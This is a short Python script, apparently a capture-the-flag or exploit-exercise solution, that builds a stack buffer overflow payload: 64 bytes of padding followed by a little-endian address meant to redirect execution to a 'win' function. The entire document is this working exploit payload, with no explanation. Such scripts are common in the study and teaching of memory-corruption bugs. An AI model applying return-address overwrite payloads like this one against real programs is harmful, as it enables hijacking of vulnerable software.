buffer = "a" * 64
win = "\x86\x91\x04\x08"        # litte endian

print(buffer + win)